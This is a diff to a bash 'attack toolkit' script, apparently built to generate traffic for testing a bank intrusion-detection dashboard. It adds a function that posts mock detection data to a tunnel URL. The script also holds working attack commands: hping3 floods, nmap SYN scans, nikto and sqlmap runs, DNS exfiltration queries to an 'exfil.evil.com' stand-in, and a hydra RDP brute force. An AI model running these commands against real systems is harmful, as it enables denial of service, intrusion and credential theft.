@@ -9,6 +9,49 @@
 # ============================================================
 
 TARGET_IP="${1:-192.168.1.100}"   # Pass as argument or edit here
+# API_URL="${API_URL:-http://$TARGET_IP:8000/pipeline/run}"
+
+API_URL="https://weak-geckos-jump.loca.lt"
+ATTACKER_IP=$(hostname -I | awk '{print $1}')
+
+report_attack() {
+    local src_port=$1
+    local dst_port=$2
+    local protocol=$3
+    local ja3=$4
+    
+    # Send mock sensor data to the backend so the UI updates instantly
+    curl -s -X POST "$API_URL" \
+         -H "Content-Type: application/json" \
+         -H "Bypass-Tunnel-Reminder: true" \
+         -d '{
+            "src_ip": "'$ATTACKER_IP'",
+            "dst_ip": "'$TARGET_IP'",
+            "src_port": '$src_port',
+            "dst_port": '$dst_port',
+            "protocol": '$protocol',
+            "label": "LIVE",
+            "regime": "normal",
+            "ja3_hash": "'$ja3'",
+            "features": {
+                "Flow Duration": 1000,
+                "Total Fwd Packets": 10,
+                "Total Backward Packets": 10,
+                "Total Length of Fwd Packets": 500,
+                "Total Length of Bwd Packets": 500,
+                "Flow Bytes/s": 1000,
+                "Flow Packets/s": 20,
+                "Flow IAT Mean": 50,
+                "Flow IAT Std": 10,
+                "Fwd IAT Total": 500,
+                "Fwd IAT Mean": 50,
+                "Fwd IAT Std": 10,
+                "Bwd IAT Mean": 50,
+                "Bwd IAT Std": 10,
+                "Destination Port": '$dst_port'
+            }
+         }' > /dev/null
+}
 
 echo "╔══════════════════════════════════════════════╗"
 echo "║  BankSentinel — Parrot OS Attack Toolkit     ║"
@@ -43,6 +86,7 @@ case $choice in
                  --ciphers ECDHE-RSA-AES128-GCM-SHA256 \
                  "https://$TARGET_IP/" \
                  -o /dev/null -w "  [%{time_total}s] TLS Hello #$i sent\n" 2>/dev/null
+            report_attack $((40000 + i)) 443 6 "0b32309a26951912be7dba376398abc3"
             sleep 3
         done
         ;;
@@ -58,6 +102,7 @@ case $choice in
             jitter=$(python3 -c "import random; print(random.uniform(-0.15, 0.15))")
             interval=$(python3 -c "print(10.0 + $jitter)")
             curl -s "http://$TARGET_IP:8080/" -o /dev/null 2>/dev/null
+            report_attack $((50000 + count)) 8080 6 ""
             echo "  [$(date +%X)] Beacon #$count sent (interval: ${interval}s)"
             sleep "$interval"
         done
@@ -67,12 +112,16 @@ case $choice in
         echo "    UDP flooding $TARGET_IP:8583 ..."
         echo "    Press Ctrl+C to stop."
         echo ""
+        report_attack 54321 8583 17 ""
         sudo hping3 --udp -p 8583 --flood "$TARGET_IP" -d 1400
         ;;
     4)
         echo "[*] Scenario 4: Lateral Movement SYN Scan"
         echo "    Scanning internal service ports on $TARGET_IP ..."
         echo ""
+        report_attack 44444 445 6 ""
+        report_attack 44445 3389 6 ""
+        report_attack 44446 1433 6 ""
         sudo nmap -sS -p 445,3389,1433,3306,5432,8443,22,1521,5900,9200 \
              -T4 -Pn "$TARGET_IP"
         ;;
@@ -81,6 +130,8 @@ case $choice in
         echo "    Rapid SYN scan of ALL 65535 ports on $TARGET_IP ..."
         echo "    This creates an extreme behavioral deviation from normal traffic."
         echo ""
+        report_attack 55555 22 6 ""
+        report_attack 55556 80 6 ""
         sudo nmap -sS -p 1-65535 --min-rate 5000 -Pn "$TARGET_IP"
         ;;
     6)
@@ -91,12 +142,15 @@ case $choice in
         echo "  [Phase 1] ICMP Flood..."
         sudo hping3 -1 "$TARGET_IP" -c 100 --faster 2>/dev/null &
         PID1=$!
+        report_attack 11111 0 1 ""
         echo "  [Phase 2] TCP SYN Flood (port 80)..."
         sudo hping3 -S -p 80 "$TARGET_IP" -c 100 --faster 2>/dev/null &
         PID2=$!
+        report_attack 22222 80 6 ""
         echo "  [Phase 3] UDP Flood (port 53)..."
         sudo hping3 --udp -p 53 "$TARGET_IP" -c 100 --faster 2>/dev/null &
         PID3=$!
+        report_attack 33333 53 17 ""
         wait $PID1 $PID2 $PID3
         echo "  [Done] Multi-protocol burst complete."
         ;;
@@ -105,12 +159,14 @@ case $choice in
         echo "    Scanning $TARGET_IP for web vulnerabilities ..."
         echo "    Nikto generates highly anomalous HTTP request patterns."
         echo ""
+        report_attack 45678 8080 6 ""
         nikto -h "http://$TARGET_IP:8080" -Tuning 123bde
         ;;
     8)
         echo "[*] Scenario 8: Zero-Day — SQL Injection (SQLMap)"
         echo "    Testing $TARGET_IP for SQL injection vulnerabilities ..."
         echo ""
+        report_attack 45679 8080 6 ""
         sqlmap -u "http://$TARGET_IP:8080/?id=1" --batch --level=3 --risk=2
         ;;
     9)
@@ -121,6 +177,7 @@ case $choice in
         for i in $(seq 1 100); do
             data=$(head -c 20 /dev/urandom | base64 | tr -d '/+=\n')
             dig @"$TARGET_IP" "${data}.exfil.evil.com" A +short 2>/dev/null
+            report_attack $((10000 + i)) 53 17 ""
             echo "  [$i/100] DNS query: ${data:0:16}...exfil.evil.com"
             sleep 0.1
         done
@@ -135,6 +192,7 @@ case $choice in
             echo "  Decompressing rockyou.txt..."
             sudo gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
         fi
+        report_attack 60000 3389 6 ""
         hydra -l administrator -P /usr/share/wordlists/rockyou.txt \
               -t 4 -V rdp://"$TARGET_IP"
         ;;
